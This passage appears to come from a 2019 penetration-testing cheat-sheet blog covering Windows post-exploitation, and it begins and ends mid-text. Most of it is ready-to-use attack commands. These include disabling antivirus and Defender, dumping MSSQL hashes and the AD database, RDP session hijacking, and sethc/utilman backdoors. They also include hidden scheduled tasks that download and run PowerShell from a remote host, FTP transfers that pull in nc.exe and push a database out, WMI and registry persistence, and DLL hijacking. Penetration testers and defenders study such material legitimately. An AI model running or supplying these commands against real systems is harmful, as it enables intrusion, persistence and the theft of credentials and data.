system.directoryservices.directorysearcher(\"(&amp;(objectcategory=user)(samaccountname=$($env:username)))\")).FindOne().GetDirectoryEntry().memberof\n</code></pre> <p>View the list of started services (search for antivirus):</p> <pre><code>    net start\n    sc query\n</code></pre> <p>Stop a service:</p> <pre><code>    net stop \"Symantec Endpoint Protection\"\n</code></pre> <p>View the list of started processes and the owner:</p> <pre><code>    tasklist /v\n</code></pre> <p>Kill a process by its name:</p> <pre><code>    taskkill /F /IM \"cmd.exe\"\n</code></pre> <p>Abort a shutdown/restart countdown:</p> <pre><code>    shutdown /a\n</code></pre> <p>Download an executable from a remote FTP server:</p> <pre><code>    echo open 10.1.2.3&gt; C:\\script.txt\n    echo user myftpuser&gt;&gt; C:\\script.txt\n    echo pass myftppass&gt;&gt; C:\\script.txt\n    echo get nc.exe&gt;&gt; C:\\script.txt\n    echo bye&gt;&gt; C:\\script.txt\n    ftp -s:script.txt\n</code></pre> <p>Upload a file to a remote FTP server:</p> <pre><code>    echo open 10.1.2.3&gt; C:\\script.txt\n    echo user myftpuser&gt;&gt; C:\\script.txt\n    echo pass myftppass&gt;&gt; C:\\script.txt\n    echo put E:\\backups\\database.dbf&gt;&gt; C:\\script.txt\n    echo bye&gt;&gt; C:\\script.txt\n    ftp -s:script.txt\n</code></pre> <p>WMI call remote system</p> <pre><code>    wmic /node:remote_computer process call create \"netstat.exe -ano &gt; C:\\output.txt\"\n</code></pre> <p>WMI get startup items</p> <pre><code>    wmic startup get Caption, Command, User\n</code></pre> <p>or</p> <pre><code>    wmic startup list full\n</code></pre> <p>WMI get enabled account password expiration</p> <pre><code>    wmic useraccount where \"disabled=0 AND localaccount=1\" get name, passwordexpires /value\n</code></pre> <p>View established connections of current machine:</p> <pre><code>    netstat -a -n -p tcp | find \"ESTAB\"\n</code></pre> <p>View open ports of current machine:</p> <pre><code>    netstat -a -n -p tcp | find \"LISTEN\"\n</code></pre> <pre><code>    netstat -a -n -p udp\n</code></pre> <p>View network configuration:</p> <pre><code>    netsh interface ip show addresses\n    netsh interface ip show route\n    netsh interface ip show neighbors\n</code></pre> <p>View current network shares:</p> <pre><code>    net share\n</code></pre> <p>Mount a remote share with the rights of the current user:</p> <pre><code>    net use K: \\\\10.1.2.3\\C$\n</code></pre> <p>Enable Remote Desktop:</p> <pre><code>    reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n</code></pre> <p>One-Liner Windows Enumeration Reference: https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7</p> <pre><code>    whoami &amp; hostname &amp; ipconfig /all &amp; net user /domain 2&gt;&amp;1 &amp; net group /domain 2&gt;&amp;1 &amp; net group \"domain admins\" /domain 2&gt;&amp;1 &amp; net group \"Exchange Trusted Subsystem\" /domain 2&gt;&amp;1 &amp; net accounts /domain 2&gt;&amp;1 &amp; net user 2&gt;&amp;1 &amp; net localgroup administrators 2&gt;&amp;1 &amp; netstat -an 2&gt;&amp;1 &amp; tasklist 2&gt;&amp;1 &amp; sc query 2&gt;&amp;1 &amp; systeminfo 2&gt;&amp;1 &amp; reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" 2&gt;&amp;1 &amp; net view &amp; net view /domain &amp; net user %USERNAME% /domain &amp; nltest /dclist &amp; gpresult /z\n</code></pre> <p>Check for unquoted service paths</p> <pre><code>    wmic service get name,displayname,pathname,startmode | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"\n</code></pre> <p>or</p> <pre><code>    gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith(\"`\"\")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(\".\") +4)) -match \".* .*\"}\n</code></pre> <p>Change Windows Proxy Settings</p> <pre><code>    Command to enable proxy usage:\n\n    reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f\n\n    Command to disable proxy usage:\n\n    reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 0 /f\n\n    Command to change the proxy address:\n\n    reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /t REG_SZ /d proxyserveraddress:proxyport /f\n\n    Also, in this case, it is a per-user setting than a system-wide setting.\n</code></pre> <p>Mount a .win image remotely on target machine</p> <pre><code>    Dism /get-wiminfo /wimfile:z:\\win7\\Acme_Win7.wim\n\n\n    Boot Dir\n    Dism /Mount-Wim /WimFile:z:\\win7\\Acme_Win7.wim /index:1 /MountDir:C:\\windows\\temp\\offline\n\n    C: Drive\n    Dism /Mount-Wim /WimFile:z:\\win7\\Acme_Win7.wim /index:2 /MountDir:C:\\windows\\temp\\offline\n\n    Dism /UnMount-Wim /MountDir:C:\\windows\\temp\\offline /discard\n</code></pre> <p>For loop example</p> <pre><code>    for /D %f in (\"C:\\Users\\username\\*\") do dir %f\n</code></pre> <p>For loop, count lines</p> <pre><code>    for /R \"C:\\users\\username\\desktop\" %f in (*) do find /c /v \"\" %f\n</code></pre> <p>Check if file is locked</p> <pre><code>    @echo off; 2&gt;nul ( &gt;&gt;file.txt echo off) &amp;&amp; (echo not locked) || (echo locked)\n</code></pre> <p>Lock a file for testing</p> <pre><code>    (&gt;&amp;2 pause) &gt;&gt; file.txt\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#dsquery","title":"DSQUERY","text":"<p>Get attributes for all Windows hosts in the Domain</p> <pre><code>dsquery * -filter \"(&amp;(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows*))\" -limit 0 |dsget computer -dn -samid -desc -loc &gt;c:\\windows\\temp\\computers.log\n</code></pre> <p>Get attributes for computers in a specific OU</p> <pre><code>dsquery computer &lt;OU=PUT OU HERE&gt; -limit 0 |dsget computer -dn -samid -desc -l &gt;c:\\windows\\temp\\out.log\n</code></pre> <p>Get attributes for users in the specified OU</p> <pre><code>    dsquery user &lt;OU=PUT OU HERE&gt; -limit 0 |dsget user -dn -samid -display -desc -office -tel -email -title -hmdir -profile -loscr -mustchpwd -canchpwd -pwdneverexpires -disabled\n</code></pre> <p>Get DC</p> <pre><code>    dsquery server -forest\n</code></pre> <p>or</p> <pre><code>    dsquery server -o rdn -forest\n</code></pre> <p>Get Domain Functional Level</p> <pre><code>    dsquery * \"DC=corp,DC=test,DC=com\" -scope base -attr msDS-Behavior-Version ntMixedDomain\n</code></pre> <p>Get Forest Functional Level</p> <pre><code>    dsquery * \"CN=Partitions,CN=Configuration,DC=corp,DC=test,DC=com\" -scope base -attr msDS-Behavior-Version ntMixedDomain\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#sqlcmd","title":"SQLCMD","text":"<p>List Databases</p> <pre><code>    sqlcmd -E -S localhost -Q \"EXEC sp_databases;\"\n</code></pre> <p>List Tables in Database</p> <pre><code>    sqlcmd -E -S localhost -Q \"SELECT * FROM DatabaseName.information_schema.tables;\" -W -w 999 -s\",\" -o \"c:\\windows\\temp\\RecruiterProd_MSCRM_tables.csv\"\n</code></pre> <p>Retrieve table contents</p> <pre><code>    sqlcmd -E -S localhost -d DatabaseName -Q \"SELECT * FROM SystemUserBase;\" -W -w 999 -s\",\" -o \"c:\\windows\\temp\\RecruiterProd_MSCRM_userbase.csv\"\n</code></pre> <p>Dump MSSQL Password Hashes</p> <pre><code>    sqlcmd -E -S localhost -Q \"SELECT name, password_hash FROM master.sys.sql_logins;\"\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#ntdsutil","title":"NTDSUTIL","text":"<p>Built-in utility to create backup copy of the AD database</p> <pre><code>    ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#applocker","title":"Applocker","text":"<p>List Applocker's effective policy on the system</p> <pre><code>    Get-ApplockerPolicy -Effective\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#windows-defender","title":"Windows Defender","text":"<p>Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender)</p> <pre><code>    c:\\program files\\windows defender\\mpcmdrun.exe\" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#appcmd","title":"APPCMD","text":"<p>Get virtual directories in IIS</p> <pre><code>    c:\\windows\\system32\\inetsrv\\appcmd.exe list vdir /text:physicalpath\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#windows-lateral-movement","title":"Windows Lateral Movement","text":"<p>RDP Hijacking</p> <p>If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command.</p> <p>Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command.</p> <p>RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation</p> <pre><code>    # View RDP sessions on system your RDP'd to with administrative permissions\n    # Locally\n    quser\n\n    # Remote\n    quser /server:&lt;servername&gt;\n\n    # Create a service that will swap your SESSIONNAME with the desired disconnected session\n    sc create sesshijack binpath= \"cmd.exe /k tscon 1 /dest:rdp-tcp#XX\" error= \"ignore\"\n\n    # Start service\n    net start sesshijack\n    or\n    sc start sesshijack\n</code></pre> <p>Linux to Windows Remoting</p> <ul> <li>In windows run</li> </ul> <pre><code>    winrm set winrm/config/Service/Auth @{Basic=\"true\"}\n    winrm set winrm/config/Service @{AllowUnencrypted=\"true\"}\n</code></pre> <ul> <li>In linux run</li> </ul> <pre><code>    $cred = Get-Credential\n    Enter-PSSession -ComputerName 'winserver1' -Credential $cred -Authentication Basic\n</code></pre> <p>PowerShell Remoting over SSH</p> <pre><code>    Enter-PSSession -Hostname &lt;IP or FQDN&gt; -Username james -SSHTransport\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#windows-persistence-methods","title":"Windows Persistence Methods","text":""},{"location":"blogs/2019/penetration-testing-pasties/#registry-keys","title":"Registry Keys","text":""},{"location":"blogs/2019/penetration-testing-pasties/#modify-registry-keys","title":"Modify registry keys","text":"<pre><code>    #Add a key/value\n    reg add \\\\&lt;systemname&gt;\\&lt;KEY&gt; /v \"&lt;value&gt;\"\" /t &lt;type (Binary,REG_SZ,etc)&gt; /d &lt;data&gt;\n\n    #Delete a key/value\n    reg delete \\\\&lt;systemname&gt;\\&lt;KEY&gt; /v \"&lt;value&gt;\"\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#userinit-key","title":"Userinit Key","text":"<p>This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:\\windows\\system32\\userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma.</p> <pre><code>    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\n    HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit = (REG_SZ) C:\\windows\\system32\\userinit.exe,c:\\windows\\badprogram.exe\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#run-key","title":"Run Key","text":"<pre><code>    #System Wide\n    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\n    #Current Logged-On User Only\n    HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n    HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run","title":"List Image File Execution Options (Debugger file executed when the target file is run)","text":"<pre><code>    HKLM\\Software\\MS\\WindowsNT\\CurrentVersion\\Image File Execution Options\\notepad.exe\\debugger(REG_SZ = cmd.exe)\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#appinit_dlls","title":"AppInit_DLLs","text":"<p>Load custom DLLs each time a program runs (If it loads USER32.dll). This is checked by most AV!</p> <p>This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system.</p> <pre><code>    HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Windows\\AppInit_DLLs\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#no-reboot-sethcutilman-option-using-a-debugger-key","title":"No-reboot sethc/utilman option using a \"debugger\" key","text":"<p>Navigate to HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ Make key called \"sethc.exe\" Make a REG_SQ value called \"Debugger\" Assign it \"c:\\windows\\system32\\cmd.exe\" as the value Hit SHIFT 5 times and get a shell as nt authority\\system</p> <pre><code>    reg add \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"c:\\windows\\system32\\cmd.exe\"\n    reg add \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /v Debugger /t REG_SZ /d \"c:\\windows\\system32\\cmd.exe\"\n</code></pre> <p>Remove the debugger key</p> <pre><code>    reg delete \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /f\n    reg delete \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /f\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#file-storage-locations","title":"File Storage Locations","text":""},{"location":"blogs/2019/penetration-testing-pasties/#startup-folders","title":"Startup Folders","text":"<pre><code>    #All Users - Windows XP\n    C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\n\n    #All Users - Windows Vista+\n    C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n\n    #User Profile - Windows XP\n    C:\\Documents and Settings\\&lt;USERNAME&gt;\\Start Menu\\Programs\\Startup\n\n    #User Profile - Windows Vista+\n    C:\\Users\\&lt;USERNAME&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#sethcutilman-replacement","title":"SETHC/UTILMAN Replacement","text":"<p>Replace these binaries, may require a reboot to take effect</p> <pre><code>    %WINDIR%\\System32\\sethc.exe\n    %WINDIR%\\System32\\utilman.exe\n</code></pre> <p>Hit shift 5 times = sethc.exe run by SYSTEM Windows key + U = utilman.exe run by SYSTEM</p>"},{"location":"blogs/2019/penetration-testing-pasties/#volume-shadow-copy-restore-points","title":"Volume Shadow Copy (Restore Points)","text":"<p>Windows service that's constantly running - takes snapshots of system directories</p> <p>Drop Malware -&gt; Create VSC (ReadOnly) -&gt; Delete Malware -&gt; Use WMIC to run VSC of malware</p> <p>Registry Key to Disable Volume Shadow Copy</p> <pre><code>    HKLM\\System\\CurrentControlSet\\Control\\BackupRestore\\FilesNotToSnapshot\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#vssadmin-native-windows-utility","title":"VSSADMIN - native windows utility","text":"<p>vssadmin create command only applies to Server OS (Win2k3,2008)</p> <pre><code>    vssadmin list shadows\n    vssadmin create shadow /for=C:\n    wmic /node:DC1 /user:DOMAIN\\domainadminsvc /password:domainadminsvc123 process call create \"cmd /c vssadmin create shadow /for=C\n    mklink /D C:\\VscAccess \\\\?\\GLOBALROOT\\Device\\HardDiskVolumeShadowCopy1\n    copy \\\\?\\GLOBALROOT\\Device\\HardDiskVolumeShadowCopy4\\path\\to\\some\\file e:\\files\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy","title":"Use WMIC process call to run an .exe from a Volume Shadow Copy","text":"<pre><code>    wmic process call create \\\\.\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\evil.exe\n</code></pre> <p>This process will not show the imagename (executable filename) or commandline parameters in the task list. The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it.</p> <pre><code>    root@kali:~# wmis -U DOMAIN\\domainadminsvc%domainadminsvc123 //ServerName \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\evil.exe\n    NTSTATUS: NT_STATUS_OK - Success\n</code></pre> <p>In Kali Linux you could use the WMIS package to do the same thing:</p> <pre><code>    wmis -U DOMAIN\\domainadminsvc%domainadminsvc123 //ServerName \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\system32\\evil.exe\n    NTSTATUS: NT_STATUS_OK - Success\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#task-scheduling","title":"Task Scheduling","text":""},{"location":"blogs/2019/penetration-testing-pasties/#at","title":"AT","text":"<p>Executes as system and must be an Admin to run it. Check groups with whoami /groups</p> <pre><code>    at 13:20 /interactive cmd\n\n    net user \\\\target /user:Domain\\user pass\n    net time \\\\target\n    at \\\\target 13:20 c:\\temp\\evil.bat\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#schtasks","title":"SCHTASKS","text":"<p>Any user can create a task</p> <p>Schedule a binary to run with arguments on system events</p> <pre><code>    #On System Startup\n    schtasks /create /TN OfficeUpdaterA /tr \"\"c:\\evil32.exe\" -k password -n services\" /SC onstart /RU system /RL HIGHEST\n    schtasks /create /TN OfficeUpdaterD /tr \"\\\"c:\\Program Files\\evil32.exe\\\" -k password -n services\" /SC onstart /RU system /RL HIGHEST\n\n    #On User Login\n    schtasks /create /TN OfficeUpdaterB /tr \"\"c:\\evil32.exe\" -k password -n services\" /SC onlogon\n    schtasks /create /TN OfficeUpdaterE /tr \"\\\"c:\\Program Files\\evil32.exe\\\" -k password -n services\" /SC onlogon\n\n    #On Idle\n    schtasks /create /TN OfficeUpdaterC /tr \"\"c:\\evil32.exe\" -k password -n services\" /SC onidle /i 30''''\n    schtasks /create /TN OfficeUpdaterF /tr \"\\\"c:\\Program Files\\evil32.exe\\\" -k password -n services\" /SC onidle /i 60\n</code></pre> <p>Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exploit\\windows\\misc\\psh_web_delivery'</p> <pre><code>    #(X86) - On User Login\n    schtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://&lt;ip address&gt;/&lt;uri&gt;'''))'\" /sc onlogon /ru System\n\n    #(X86) - On System Start\n    schtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://&lt;ip address&gt;/&lt;uri&gt;'''))'\" /sc onstart /ru System\n\n    #(X86) - On User Idle (30mins)\n    schtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://&lt;ip address&gt;/&lt;uri&gt;'''))'\" /sc onidle /i 30\n\n    #(X64) - On User Login\n    schtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://&lt;ip address&gt;/&lt;uri&gt;'''))'\" /sc onlogon /ru System\n\n    #(X64) - On System Start\n    schtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://&lt;ip address&gt;/&lt;uri&gt;'''))'\" /sc onstart /ru System\n\n    #(X64) - On User Idle (30mins)\n    schtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#additional-notes","title":"Additional Notes","text":"<p>Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash () AND quotation marks (\"):</p> <p>Delete scheduled task without prompting</p> <pre><code>    schtasks /delete /f /TN taskname\n</code></pre> <p>Detailed scheduled tasks listing</p> <pre><code>    schtasks /query /V /FO list\n</code></pre> <p>View scheduled tasks log (for troubleshooting)</p> <pre><code>    notepad c:\\windows\\schedlgu.txt (Windows XP)\n\n    notepad c:\\windows\\tasks\\schedlgu.txt (Vista+)\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#windows-service","title":"Windows Service","text":"<pre><code>    sc query\n    sc create &lt;\\\\Target(optional)&gt; &lt;servicename&gt; binPath= &lt;service binary path&gt; type= share start= auto DisplayName= &lt;display name&gt;\n    sc delete &lt;servicename&gt;\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#dll-hijacking","title":"DLL-Hijacking","text":"<p>Order of DLL Loading</p> <pre><code>1. The directory from which the application is loaded\n2. The current directory\n3. The system directory, usually C:\\\\Windows\\\\System32\\\\ (The GetSystemDirectory function is called to obtain this directory.)\n4. The 16-bit system directory - There is no dedicated function to retrieve the path of this directory, but it is searched as well.\n5. The Windows directory. The GetWindowsDirector function is called to obtain this directory.\n6. The directories that are listed in the PATH environment variable.\n</code></pre> <p>Many systems use bginfo (seen it a lot in operational sys). Drop Riched32.dll in the dir with bginfo.exe. Codex.</p> <p>Older list of dlls as well (2010). https://www.exploit-db.com/dll-hijacking-vulnerable-applications/</p> <p>On Windows 7 there are three executables that could be exploited and associated DLLs listed below</p> <pre><code>    C:\\windows\\ehome\\Mcx2Prov.exe\n    C:\\Windows\\ehome\\CRYPTBASE.dll\n\n    C:\\windows\\System32\\sysprep\\sysprep.exe\n    C:\\Windows\\System32\\sysprep\\CRYPTSP.dll\n    C:\\windows\\System32\\sysprep\\CRYPTBASE.dll\n    C:\\Windows\\System32\\sysprep\\RpcRtRemote.dll\n    C:\\Windows\\System32\\sysprep\\UxTheme.dll\n\n    C:\\windows\\System32\\cliconfg.exe\n    C:\\Windows\\System32\\NTWDBLIB.DLL\n</code></pre> <p>On Windows 8 there are also three executables that could be exploited and associated DLLs listed below</p> <pre><code>    C:\\windows\\System32\\sysprep\\sysprep.exe\n    C:\\windows\\System32\\sysprep\\CRYPTBASE.dll\n    C:\\Windows\\System32\\Sysprep\\dwmapi.dll\n    C:\\Windows\\System32\\Sysprep\\SHCORE.dll\n\n    C:\\windows\\System32\\cliconfg.exe\n    C:\\Windows\\System32\\NTWDBLIB.DLL\n\n    C:\\windows\\System32\\pwcreator.exe\n    C:\\Windows\\System32\\vds.exe\n    C:\\Windows\\System32\\UReFS.DLL\n</code></pre> <p>Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below</p> <pre><code>    C:\\windows\\System32\\sysprep\\sysprep.exe\n    C:\\Windows\\System32\\Sysprep\\SHCORE.dll\n    C:\\Windows\\System32\\Sysprep\\OLEACC.DLL\n\n    C:\\windows\\System32\\cliconfg.exe\n    C:\\Windows\\System32\\NTWDBLIB.DLL\n\n    C:\\windows\\System32\\pwcreator.exe\n    C:\\Windows\\System32\\vds.exe\n    C:\\Program Files\\Common Files\\microsoft shared\\ink\\CRYPTBASE.dll\n    C:\\Program Files\\Common Files\\microsoft shared\\ink\\CRYPTSP.dll\n    C:\\Program Files\\Common Files\\microsoft shared\\ink\\dwmapi.dll\n    C:\\Program Files\\Common Files\\microsoft shared\\ink\\USERENV.dll\n    C:\\Program Files\\Common Files\\microsoft shared\\ink\\OLEACC.dll\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#linkinfodll-replacement","title":"linkinfo.dll Replacement","text":"<p>Windows explorer in older systems loads linkinfo.dll from c:\\windows over c:\\windows\\system32 if it exists</p> <pre><code>    copy evil.dll c:\\windows\\linkinfo.dll\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#wmi-event-persistence-via-powershell","title":"WMI Event Persistence via Powershell","text":"<p>WMI Event persistence explained, you can find a bloated version in powersploit. Three parts to this:</p> <ul> <li>WMI Event Filter</li> <li>Event Consumer</li> <li>Filter/Consumer Binding   This technique gets you SYSTEM level persistence, requires admin rights to execute.   Autoruns doesn't even check for this yet. (doubt any AVs are either)   Difficult to detect, Difficult to remove if you dont know what youre doing.</li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#wmi-event-filter","title":"WMI Event Filter","text":"<p>Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing)</p> <pre><code>    $EventFilter = ([WMICLASS]\"\\\\.\\root\\subscription:__EventFilter\").CreateInstance()\n    $EventFilter.QueryLanguage  = \"WQL\"\n    $EventFilter.Query          = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325\"\n    $EVentFilter.EventNamespace = \"root\\cimv2\"\n    $EventFilter.Name           = \"OBVIOUSHACKER\"\n    $Result = $EventFilter.Put()\n    $Filter = $Result.Path\n</code></pre> <p>http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx</p>"},{"location":"blogs/2019/penetration-testing-pasties/#event-consumer","title":"Event Consumer","text":"<p>Configure what to execute once the event occurs. Current example is just a ping.</p> <pre><code>    $InstanceConsumer = ([wmiclass]\"\\\\.\\root\\subscription:CommandLineEventConsumer\").CreateInstance()\n    $InstanceConsumer.Name = \"OBVIOUSHACKER\"\n    $InstanceConsumer.CommandLineTemplate = \"ping 127.0.0.1 -n 100\"          #CMD TO EXECUTE HERE\n    $InstanceConsumer.WorkingDirectory = \"C:\\\\windows\\\\system32\"\n    $Result = $InstanceConsumer.Put()\n    $Consumer = $Result.Path\n</code></pre> <p>http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx</p>"},{"location":"blogs/2019/penetration-testing-pasties/#filterconsumer-binding","title":"Filter/Consumer Binding","text":"<p>This is the object that correlates the Filter with the Consumer. Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service.</p> <pre><code>    $InstanceBinding = ([wmiclass]\"\\\\.\\root\\subscription:__FilterToConsumerBinding\").CreateInstance()\n    $InstanceBinding.Filter   = $Filter\n    $InstanceBinding.Consumer = $Consumer\n    $Result = $InstanceBinding.Put()\n</code></pre> <p>http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx</p>"},{"location":"blogs/2019/penetration-testing-pasties/#removal","title":"REMOVAL","text":"<p>The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example)</p> <pre><code>    Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='OBVIOUSHACKER'\"| Remove-WmiObject\n    Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -filter \"name='OBVIOUSHACKER'\" | Remove-WmiObject\n    Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object { $_.filter -match 'OBVIOUSHACKER'} | Remove-WmiObject\n</code></pre> <p>Some more detailed information on the subject</p> <p>http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/</p>"},{"location":"blogs/2019/penetration-testing-pasties/#malicious-outlook-rules","title":"Malicious Outlook Rules","text":"<ul> <li>https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/</li> <li> <p>Ruler</p> </li> <li> <p>https://github.com/sensepost/ruler</p> </li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#windows-remote-management-winrm-psremoting","title":"Windows Remote Management (WinRM) / PSRemoting","text":"<ul> <li>Listens on 5985/5986 by default and allows interactive shell access over HTTP/S</li> <li>Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module)</li> <li>Metasploit has multiple modules for locating the service and gaining shells over WinRM</li> </ul> <p>Connect to a remote host with WinRM from local Windows host</p> <pre><code>    Enable-PSRemoting\n    Set-Item -Path WSMan:\\localhost\\Client\\TrustedHosts * -force\n    or\n    Set-Item -Path WSMan:\\localhost\\Client\\TrustedHosts -value \"&lt;host&gt;\" -Force\n    $cred = Get-Credential\n    Invoke-Command -ComputerName &lt;host&gt; -ScriptBlock { gci c:\\ } -credential $cred\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#uninstall-a-patch-to-leave-the-system-vulnerable","title":"Uninstall a patch to leave the system vulnerable","text":"<pre><code>    wusa.exe /uninstall 